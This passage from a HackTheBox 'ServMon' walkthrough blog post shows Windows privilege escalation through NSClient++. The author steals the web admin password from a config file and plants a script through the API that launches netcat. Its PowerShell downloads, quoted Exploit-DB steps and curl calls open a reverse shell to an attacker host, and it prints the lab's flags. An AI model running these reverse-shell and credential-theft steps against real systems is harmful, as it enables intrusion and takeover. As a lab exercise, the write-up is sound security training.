               0 File(s)              0 bytes
              15 Dir(s)  27,866,316,800 bytes free

nadine@SERVMON C:\Users\Nadine&gt;cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    &lt;DIR&gt;          .
08/04/2020  22:28    &lt;DIR&gt;          ..
12/05/2020  07:35                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,866,320,896 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop&gt;type user.txt
7a2a9417558a347042964103acc4c2c1

nadine@SERVMON C:\Users\Nadine\Desktop&gt;
</code></pre></div></div>

<h3 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h3>

<p>For privesc, we can use <code class="language-plaintext highlighter-rouge">winPEAS.bat</code> to see all of the services on the server. Here we tried to download from our local machine to server machine using <code class="language-plaintext highlighter-rouge">powershell.exe wget</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:\&gt;powershell.exe wget "http://10.10.14.15:80/winPEAS.bat" -outfile "c:\temp\winPEAS.bat"

nadine@SERVMON C:\&gt;cd c:\temp

nadine@SERVMON c:\Temp&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of c:\Temp

12/05/2020  08:40    &lt;DIR&gt;          .
12/05/2020  08:40    &lt;DIR&gt;          ..
12/05/2020  08:37                 0 powershell.exe
12/05/2020  08:40            32,976 winPEAS.bat
               2 File(s)         32,976 bytes
               2 Dir(s)  27,863,298,048 bytes free

nadine@SERVMON c:\Temp&gt;
</code></pre></div></div>

<p>Run the <code class="language-plaintext highlighter-rouge">winPEAS.bat</code> program and see the services that are running on the administrator, below the output from winPEAS.bat.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;redacted&gt;
Common Files
Common Files
InstallShield Installation Information
Internet Explorer
Internet Explorer
Microsoft.NET
ModifiableWindowsApps
NSClient++
NVMS-1000
Reference Assemblies
Reference Assemblies
UNP
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Multimedia Platform
Windows Multimedia Platform
Windows NT
Windows NT
Windows Photo Viewer
Windows Photo Viewer
Windows Portable Devices
Windows Portable Devices
Windows Security
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
    InstallLocation    REG_SZ    C:\Program Files (x86)\NVMS-1000\
    InstallLocation    REG_SZ    C:\Program Files (x86)\NVMS-1000\
&lt;redacted&gt;
</code></pre></div></div>
<p>From the output displayed, it can be seen that the services running and connecting to the server are NVMS-1000 and NSClient++, and also we can see on winPEAS result used ports</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;redacted&gt;
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; [+] USED PORTS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Check for services restricted from the outside
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2524
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2716
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5036
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       480
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1060
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1492
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2072
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2380
  TCP    10.10.10.184:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       2524
  TCP    [::]:22                [::]:0                 LISTENING       2716
  TCP    [::]:135               [::]:0                 LISTENING       864
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5666              [::]:0                 LISTENING       2628
  TCP    [::]:49664             [::]:0                 LISTENING       620
  TCP    [::]:49665             [::]:0                 LISTENING       480
  TCP    [::]:49666             [::]:0                 LISTENING       1060
  TCP    [::]:49667             [::]:0                 LISTENING       1492
  TCP    [::]:49668             [::]:0                 LISTENING       2072
  TCP    [::]:49669             [::]:0                 LISTENING       612
  TCP    [::]:49670             [::]:0                 LISTENING       2380

&lt;redacted&gt;
</code></pre></div></div>
<p>we can see NSClient++ runs on port <code class="language-plaintext highlighter-rouge">8443</code>, and that is matching with our network scanning result from Nmap</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;redacted&gt;
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
&lt;redacted&gt;
</code></pre></div></div>

<p>okay, let’s find the vulnerability and exploit using searchploit</p>

<p><img src="/assets/images/htb-machine-servmon/06.png" alt="06" /></p>

<p>use NSClient++ 0.5.2.35 - Privilege Escalation and it shows how to “privilege escalation” using nsclient++</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
   C:\Program Files\NSClient++&gt;nscp web -- password --display
   Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
   @echo off
   c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
   nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings &gt; External Scripts &gt; Scripts
- Add New
   - foobar
      command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings &gt; Scheduler &gt; Schedules
- Add new
   - foobar
      interval = 1m
      command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
   nc -nlvvp 443
   listening on [any] 443 ...
   connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
   Microsoft Windows [Version 10.0.17134.753]
   (c) 2018 Microsoft Corporation. All rights reserved.

   C:\Program Files\NSClient++&gt;whoami
   whoami
   nt authority\system
   
Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System

</code></pre></div></div>
<p>Okay we follow the instruction from the note</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>===================================================================
From note
===================================================================
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
 C:\Program Files\NSClient++&gt;nscp web -- password --display
 Current password: SoSecret

===================================================================
From attacker
===================================================================

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine&gt;cd C:\Program Files\NSClient++

nadine@SERVMON C:\Program Files\NSClient++&gt;type nsclient.ini 
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all                                  
# If you want to activate a module and bring in all its options use:                    
#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults                        
# For details run: nscp settings --help                                                 
                                                                                        
                                                                                        
; in flight - TODO                                                                      
[/settings/default]                                                                     
                                                                                        
; Undocumented key                                                                      
password = ew2x6SsGTxjRwXOT                                                             
                               
; Undocumented key             
allowed hosts = 127.0.0.1      
                               
                               
; in flight - TODO             
[/settings/NRPE/server]        
                               
; Undocumented key             
ssl options = no-sslv2,no-sslv3
                               
; Undocumented key             
verify mode = peer-cert        
                               
; Undocumented key             
insecure = false               
                               
                               
; in flight - TODO             
[/modules]                     

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scrip
ts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexit
code) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true

nadine@SERVMON C:\Program Files\NSClient++&gt;nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Program Files\NSClient++&gt;

</code></pre></div></div>

<p>We got the password nsclient++ : <code class="language-plaintext highlighter-rouge">ew2x6SsGTxjRwXOT</code>. To access the web page, we need using port forwarding using ssh</p>

<p><code class="language-plaintext highlighter-rouge">ssh -L 9000:127.0.0.1:8443 nadine@10.10.10.184</code></p>

<p>And open google chromium (note: some of the members at HTB forum, recommend to use those), but very slow. So we skipped using a chrome browser.</p>

<p><img src="/assets/images/htb-machine-servmon/07.png" alt="07" /></p>

<h4 id="privilege-escalation-using-nsclient-api">Privilege Escalation using NSClient++ API</h4>

<p>to access nsclient++, we have followed the instructions from https://docs.nsclient.org/api/rest/queries/#command-execute</p>

<p>go back again to the note, create evil.bat and follow like the instructions and put out an IP address</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>===================================================================
From note
===================================================================

3. Download nc.exe and evil.bat to c:\temp from attacking machine
 @echo off
 c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
 
===================================================================
From attacker
===================================================================

@echo off
c:\temp\nc.exe -e 10.10.14.15 443 powershell 
</code></pre></div></div>

<p><img src="/assets/images/htb-machine-servmon/08.png" alt="08" /></p>

<p>download nc.exe from your computer, and prepare nc.exe and evil.bat and run the webserver</p>

<p><img src="/assets/images/htb-machine-servmon/09.png" alt="09" /></p>

<p>run these instructions to download nc.exe and evil.bat</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:\Program Files\NSClient++&gt;cd c:\

nadine@SERVMON c:\&gt;powershell.exe wget "http://10.10.14.15/nc.exe" -outfile "c:\temp\nc.exe"

nadine@SERVMON c:\&gt;powershell.exe wget "http://10.10.14.15/evil.bat" -outfile "c:\temp\me.bat"

nadine@SERVMON c:\&gt;cd c:\temp

nadine@SERVMON c:\Temp&gt;
</code></pre></div></div>

<p>follow the instructions from https://docs.nsclient.org/api/rest/queries/#command-execute and another terminal to access netcat</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON c:\Temp&gt;curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/
scripts/me.bat --data-binary "C:\Temp\nc.exe 10.10.14.15 443 -e cmd.exe"
Enter host password for user 'admin':ew2x6SsGTxjRwXOT
Added me as scripts\me.bat
nadine@SERVMON c:\Temp&gt;curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/me/commands
/execute?time=3m
Enter host password for user 'admin':ew2x6SsGTxjRwXOT

</code></pre></div></div>

<p><img src="/assets/images/htb-machine-servmon/10.png" alt="10" /></p>

<p>Let’s create a listener using netcat on our local machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@twsterlab:/twseptian# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:49686.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++&gt;whoami
whoami
nt authority\system

C:\Program Files\NSClient++&gt;cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator

08/04/2020  22:55    &lt;DIR&gt;          .
08/04/2020  22:55    &lt;DIR&gt;          ..
08/04/2020  23:12    &lt;DIR&gt;          3D Objects
08/04/2020  23:12    &lt;DIR&gt;          Contacts
08/04/2020  23:12    &lt;DIR&gt;          Desktop
08/04/2020  23:12    &lt;DIR&gt;          Documents
08/04/2020  23:12    &lt;DIR&gt;          Downloads
08/04/2020  23:12    &lt;DIR&gt;          Favorites
08/04/2020  23:12    &lt;DIR&gt;          Links
08/04/2020  23:12    &lt;DIR&gt;          Music
14/01/2020  19:10    &lt;DIR&gt;          OneDrive
08/04/2020  23:12    &lt;DIR&gt;          Pictures
08/04/2020  23:12    &lt;DIR&gt;          Saved Games
08/04/2020  23:12    &lt;DIR&gt;          Searches
08/04/2020  23:12    &lt;DIR&gt;          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator

08/04/2020  22:55    &lt;DIR&gt;          .
08/04/2020  22:55    &lt;DIR&gt;          ..
08/04/2020  23:12    &lt;DIR&gt;          3D Objects
08/04/2020  23:12    &lt;DIR&gt;          Contacts
08/04/2020  23:12    &lt;DIR&gt;          Desktop
08/04/2020  23:12    &lt;DIR&gt;          Documents
08/04/2020  23:12    &lt;DIR&gt;          Downloads
08/04/2020  23:12    &lt;DIR&gt;          Favorites
08/04/2020  23:12    &lt;DIR&gt;          Links
08/04/2020  23:12    &lt;DIR&gt;          Music
14/01/2020  19:10    &lt;DIR&gt;          OneDrive
08/04/2020  23:12    &lt;DIR&gt;          Pictures
08/04/2020  23:12    &lt;DIR&gt;          Saved Games
08/04/2020  23:12    &lt;DIR&gt;          Searches
08/04/2020  23:12    &lt;DIR&gt;          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator&gt;cd Desktop
cd Desktop

C:\Users\Administrator\Desktop&gt;dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator\Desktop

08/04/2020  23:12    &lt;DIR&gt;          .
08/04/2020  23:12    &lt;DIR&gt;          ..
12/05/2020  07:35                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
fbb4677e30b545a5a9502b31a8bfa1bd

C:\Users\Administrator\Desktop&gt;
</code></pre></div></div>

<p><img src="/assets/images/htb-machine-servmon/11.png" alt="11" /></p>

<p><img src="/assets/images/htb-machine-servmon/12.png" alt="12" /></p>

<p>Reference:</p>
<ol>
  <li>NSClient++ 0.5.2 API REST Queries https://docs.nsclient.org/api/rest/queries/#command-execute</li>
</ol>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
  
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox-machine" class="page__taxonomy-item" rel="tag">HackTheBox Machine</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-19">June 19, 2020</time></p>


      </footer>
      
      
  <nav class="pagination">
    
      <a href="/tryhackme/thm-simple-ctf/" class="pagination--pager" title="TryHackMe - Simple CTF
">Previous</a>
    
    
      <a href="/tryhackme/thm-easy-steganography/" class="pagination--pager" title="TryHackMe - Easy Steganography
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
- Date: 07/01/2022
- Exploit Au...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
- Date: 05/01/20222
- Exploit Author: tw...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
- Date: 2021-12-30
- ...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
    
      <li><strong>Follow:</strong></li>
    
    
      
        
      
          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
          </li>
        
      
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>

</div>
<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://localhost:4000/hackthebox%20machine/htb-machine-servmon/";  /* Replace PAGE_URL with your page's canonical URL variable */
      this.page.identifier = "/hackthebox%20machine/htb-machine-servmon"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
    };
    (function() { /* DON'T EDIT BELOW THIS LINE */
      var d = document, s = d.createElement('script');
      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
